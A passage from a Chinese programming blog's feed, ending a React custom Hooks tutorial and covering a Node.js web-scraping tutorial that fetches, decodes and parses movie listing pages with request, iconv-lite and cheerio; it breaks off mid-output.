class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> onResize = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setSize</span>(&#123;</span><br><span class="line">      <span class="attr">width</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>,</span><br><span class="line">      <span class="attr">height</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, onResize);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&quot;resize&quot;</span>, onResize);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;, [onResize]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>自定义Hooks<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        页面的大小为：&#123;size.width&#125; * &#123;size.height&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显示效果：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200209215609.png" alt=""></p><p>如果我们想在别的组件中使用，那么可以在别的组件中直接引入 <code>ShowWindowSize</code> 即可。</p><p>但是这样有必要吗，如果我们仅仅需要某个组件的能力（如上述组件的计算页面大小的能力），是否可以单独引入该能力，而不去引入一个组件，这就是自定义 Hook 存在的原因。</p><p>我们可以将计算页面大小的能力单独处理为一个 <code>useWinSize()</code> 方法，这个方法就是一个自定义 Hook，按照规范自定义 Hook 必须以 <code>use</code> 开头。实际上自定义 Hook 就类似于创建了一个方法，不过可以使用 React Hook 中的部分能力。</p><p>我们将计算窗口高度的方法抽离为一个名为 <code>useWinSize</code> 的自定义 Hook：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">useWinSize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [size, setSize] = <span class="title function_">useState</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> onResize = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setSize</span>(&#123;</span><br><span class="line">      <span class="attr">width</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>,</span><br><span class="line">      <span class="attr">height</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, onResize);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&quot;resize&quot;</span>, onResize);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;, [onResize]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回一个 size 对象</span></span><br><span class="line">  <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在普通组件中，我们可以通过引入该 Hook 来获取 size 对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ShowWindowSize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> size = <span class="title function_">useWinSize</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>自定义Hooks<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        页面的大小为：&#123;size.width&#125; * &#123;size.height&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，与普通函数一样，自定义 Hook 也可以传递参数，这里就不再演示。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS爬虫基础原理及实战</title>
      <link href="/2020/02/475edda2351e.html"/>
      <url>/2020/02/475edda2351e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-原始数据的获取"><a href="#1-原始数据的获取" class="headerlink" title="1. 原始数据的获取"></a>1. 原始数据的获取</h1><h2 id="1-1-原生-http-模块获取数据"><a href="#1-1-原生-http-模块获取数据" class="headerlink" title="1.1 原生 http 模块获取数据"></a>1.1 原生 http 模块获取数据</h2><p>http 是 node 内置的一个模块，可以使用该模块来发送一个简单的 http 请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">get</span>(<span class="string">&quot;http://www.baidu.com&quot;</span>, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setEncoding</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">  res.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="1-2-使用-request-模块获取数据"><a href="#1-2-使用-request-模块获取数据" class="headerlink" title="1.2 使用 request 模块获取数据"></a>1.2 使用 request 模块获取数据</h2><p>request 是一个第三方模块，可以更好的封装请求服务：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&quot;request&quot;</span>);</span><br><span class="line"><span class="title function_">request</span>(<span class="string">&quot;http://www.baidu.com&quot;</span>, <span class="function">(<span class="params">error, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error: &quot;</span>, error);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;res: &quot;</span>, res);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;body: &quot;</span>, body);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="1-3-使用-iconv-lite-解决编码问题"><a href="#1-3-使用-iconv-lite-解决编码问题" class="headerlink" title="1.3 使用 iconv-lite 解决编码问题"></a>1.3 使用 iconv-lite 解决编码问题</h2><p>我们使用 <a href="https://www.ygdy8.net/index.html">阳光电影网</a> 作为原始数据的抓取网站对象，但是由于该网站过于老旧，网站的编码格式为 <code>gb2312</code>，而原生 node 中支持的编码格式为：</p><ul><li>ascii</li><li>base64</li><li>binary</li><li>hex</li><li>ucs2/ucs-2/utf16le/utf-16le</li><li>utf8/utf-8</li><li>latin1 (ISO8859-1, only in node 6.4.0+)</li></ul><p>并不支持 <code>gb2312</code>，且默认回按照 <code>utf8</code> 的编码格式去解析文本，因此直接抓取网页数据会返回乱码结果，使用 <code>iconv-lite</code> 模块可以解决这一问题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&quot;request&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> iconv = <span class="built_in">require</span>(<span class="string">&quot;iconv-lite&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">request</span>(</span><br><span class="line">  <span class="string">&quot;https://www.ygdy8.net/html/gndy/oumei/list_7_2.html&quot;</span>,</span><br><span class="line">  &#123; <span class="attr">encoding</span>: <span class="literal">null</span> &#125;, <span class="comment">// 默认为 utf8 错误编码</span></span><br><span class="line">  <span class="function">(<span class="params">error, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> bufs = iconv.<span class="title function_">decode</span>(body, <span class="string">&quot;gb2312&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> html = bufs.<span class="title function_">toString</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="2-数据的处理"><a href="#2-数据的处理" class="headerlink" title="2. 数据的处理"></a>2. 数据的处理</h1><h2 id="2-1-cheerio"><a href="#2-1-cheerio" class="headerlink" title="2.1 cheerio"></a>2.1 cheerio</h2><p><code>cheerio</code> 是一个模拟 jQuery 的运行再 node 环境下的 HTML 解析器，可以将 HTML 字符串按照 jQuery 的方式进行快捷处理：</p><p>Demo:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&quot;cheerio&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(<span class="string">`&lt;h2 class=&quot;title&quot;&gt;Hello world&lt;/h2&gt;`</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;h2.title&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;Hello there!&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;h2&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($.<span class="title function_">html</span>());</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title welcome&quot;</span>&gt;</span>Hello there!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-2-并发抓取与处理数据"><a href="#2-2-并发抓取与处理数据" class="headerlink" title="2.2 并发抓取与处理数据"></a>2.2 并发抓取与处理数据</h2><p>我们仍以 <a href="https://www.ygdy8.net/index.html">阳光电影网</a> 作为数据的抓取对象，在其 <a href="https://www.ygdy8.net/html/gndy/oumei/list_7_1.html">欧美专区</a> 中可以获取到电影的列表，如下图所示：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200203224210.png" alt=""></p><p>利用 Chrome 的开发者工具可以获取到每个电影详情页面的链接，并获取其节点的选择器，如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200203224426.png" alt=""></p><p>通过 <code>cheerio</code> 我们可以选择到该节点并获取其链接：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对 request 模块进行封装</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">requestPromise</span> = url =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">request</span>(</span><br><span class="line">      url,</span><br><span class="line">      &#123; <span class="attr">encoding</span>: <span class="literal">null</span> &#125;, <span class="comment">// 默认为 utf8 错误编码</span></span><br><span class="line">      <span class="function">(<span class="params">error, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">statusCode</span> === <span class="number">200</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> bufs = iconv.<span class="title function_">decode</span>(body, <span class="string">&quot;gb2312&quot;</span>);</span><br><span class="line">          <span class="keyword">const</span> html = bufs.<span class="title function_">toString</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">          <span class="title function_">resolve</span>(html);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> host = <span class="string">&quot;https://www.ygdy8.net&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getList</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">requestPromise</span>(url);</span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(html);</span><br><span class="line">  $(</span><br><span class="line">    <span class="string">&quot;.co_content8 ul table tbody tr:nth-child(2) td:nth-child(2) b a:nth-child(2)&quot;</span></span><br><span class="line">  ).<span class="title function_">each</span>(<span class="function">(<span class="params">i, item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> href = $(item).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(href);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getList</span>(<span class="string">&quot;https://www.ygdy8.net/html/gndy/oumei/list_7_1.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/html/gndy/dyzz/20200127/59623.html</span><br><span class="line">/html/gndy/jddy/20200127/59620.html</span><br><span class="line">/html/gndy/jddy/20200127/59619.html</span><br><span class="line">/html/gndy/dyzz/20200125/59616.html</span><br><span class="line">/html/gndy/dyzz/20200123/59611.html</span><br><span class="line">/html/gndy/jddy/20200123/59610.html</span><br><span class="line">/html/gndy/dyzz/20200121/59608.html</span><br><span class="line">/html/gndy/dyzz/20200121/59607.html</span><br><span class="line">/html/gndy/dyzz/20200120/59605.html</span><br><span class="line">/html/gndy/dyzz/20200119/59600.html</span><br><span class="line">/html/gndy/dyzz/20200119/59598.html</span><br><span class="line">/html/gndy/dyzz/20200117/59597.html</span><br><span class="line">/html/gndy/dyzz/20200117/59596.html</span><br><span class="line">/html/gndy/jddy/20200116/59592.html</span><br><span class="line">/html/gndy/dyzz/20200116/59591.html</span><br><span class="line">/html/gndy/dyzz/20200116/59590.html</span><br><span class="line">/html/gndy/dyzz/20200115/59589.html</span><br><span class="line">/html/gndy/dyzz/20200115/59588.html</span><br><span class="line">/html/gndy/jddy/20200115/59587.html</span><br><span class="line">/html/gndy/dyzz/20200114/59583.html</span><br><span class="line">/html/gndy/dyzz/20200114/59582.html</span><br><span class="line">/html/gndy/jddy/20200114/59581.html</span><br><span class="line">/html/gndy/dyzz/20200113/59577.html</span><br><span class="line">/html/gndy/dyzz/20200113/59576.html</span><br><span class="line">/html/gndy/jddy/20200113/59575.html</span><br></pre></td></tr></table></figure><p>当我们获取到一个电影的详情页面 url 后，就可以单独打开每个页面，然后利用 <code>cheerio</code> 去抓取数据详情。</p><p>我们通过分析电影详情页面，先输出单个电影的详情页：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getMovieDetail</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">requestPromise</span>(url);</span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(html);</span><br><span class="line">  <span class="keyword">const</span> movie = &#123;</span><br><span class="line">    <span class="attr">name</span>: $(<span class="string">&quot;.bd3l &gt; div.co_area2 &gt; div.title_all h1 font&quot;</span>).<span class="title function_">text</span>(),</span><br><span class="line">    <span class="comment">// desc 过长文章中省略输出</span></span><br><span class="line">    <span class="comment">// desc: $(&quot;#Zoom &gt; span &gt; p:nth-child(1)&quot;).text(), </span></span><br><span class="line">    <span class="attr">picture</span>: $(<span class="string">&quot;#Zoom &gt; span &gt; p:nth-child(1) &gt; img:nth-child(1)&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(movie);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getMovieDetail</span>(<span class="string">`https://www.ygdy8.net/html/gndy/dyzz/20200127/59623.html`</span>);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  name: &#x27;2019年剧情《谎言大师》BD中英双字幕&#x27;,</span><br><span class="line">  picture: &#x27;https://lookimg.com/images/2020/01/26/JMBaW.jpg&#x27; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合了上面的抓取方法之后，我们可以采用并发的方式，去抓取欧美电影第一页的所有电影的详情信息，完整代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&quot;request&quot;</span>);</span><br><span class="line"><span class="comment">// 使用 iconv-lite 对老旧网站进行编码转换</span></span><br><span class="line"><span class="keyword">const</span> iconv = <span class="built_in">require</span>(<span class="string">&quot;iconv-lite&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&quot;cheerio&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">requestPromise</span> = url =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">request</span>(</span><br><span class="line">      url,</span><br><span class="line">      &#123; <span class="attr">encoding</span>: <span class="literal">null</span> &#125;, <span class="comment">// 默认为 utf8 错误编码</span></span><br><span class="line">      <span class="function">(<span class="params">error, res, body</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">statusCode</span> === <span class="number">200</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> bufs = iconv.<span class="title function_">decode</span>(body, <span class="string">&quot;gb2312&quot;</span>);</span><br><span class="line">          <span class="keyword">const</span> html = bufs.<span class="title function_">toString</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">          <span class="title function_">resolve</span>(html);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> host = <span class="string">&quot;https://www.ygdy8.net&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getMovieDetail</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">requestPromise</span>(url);</span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(html);</span><br><span class="line">  <span class="keyword">const</span> movie = &#123;</span><br><span class="line">    <span class="attr">name</span>: $(<span class="string">&quot;.bd3l &gt; div.co_area2 &gt; div.title_all h1 font&quot;</span>).<span class="title function_">text</span>(),</span><br><span class="line">    <span class="comment">// desc: $(&quot;#Zoom &gt; span &gt; p:nth-child(1)&quot;).text(),</span></span><br><span class="line">    <span class="attr">picture</span>: $(<span class="string">&quot;#Zoom &gt; span &gt; p:nth-child(1) &gt; img:nth-child(1)&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(movie);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getList</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">requestPromise</span>(url);</span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(html);</span><br><span class="line">  $(</span><br><span class="line">    <span class="string">&quot;.co_content8 ul table tbody tr:nth-child(2) td:nth-child(2) b a:nth-child(2)&quot;</span></span><br><span class="line">  ).<span class="title function_">each</span>(<span class="function">(<span class="params">i, item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> href = $(item).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>);</span><br><span class="line">    <span class="title function_">getMovieDetail</span>(host + href);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getList</span>(<span class="string">&quot;https://www.ygdy8.net/html/gndy/oumei/list_7_1.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#123; name: &#x27;2018年高分获奖《他们已不再变老》BD英语中字&#x27;, picture: undefined &#125;</span><br><span class="line">&#123; name: &#x27;2019年高分获奖剧情《痛苦与荣耀》BD中英双字幕&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/14/9d77f7ad1383c453106e321ea6611606.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年惊悚剧情《劫匪/公路响马》BD中英双字幕&#x27;,</span><br><span class="line">  picture: &#x27;https://lookimg.com/images/2020/01/21/JO1zh.jpg&#x27; &#125;</span><br><span class="line">&#123; name: &#x27;2019年奇幻冒险《沉睡魔咒2》BD国英双语双字&#x27;,</span><br><span class="line">  picture:</span><br><span class="line">   &#x27;https://extraimage.net/images/2020/01/01/3ed5aaa5a2bff645bc258519b6338ba2.jpg&#x27; &#125;</span><br><span class="line">&#123; name: 